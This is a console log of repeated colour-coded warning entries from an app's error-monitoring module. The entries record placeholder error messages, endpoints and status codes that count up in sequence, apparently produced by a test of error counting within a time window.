WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1938'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790770Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1939'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1940'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1941'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790927Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1942'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.790978Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1943'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791028Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1944'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791078Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1945'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791128Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1946'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791179Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1947'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791229Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1948'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791280Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m39[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1949'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791333Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1950'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791386Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1951'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1952'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791486Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1953'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1954'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791657Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1955'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791720Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1956'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791778Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1957'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791838Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1958'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1959'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791947Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1960'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.791997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1961'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792047Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1962'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792097Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1963'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792146Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1964'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1965'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1966'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792294Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1967'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1968'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1969'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1970'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792491Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1971'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1972'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792587Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1973'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792635Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1974'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1975'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792730Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1976'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792778Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1977'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
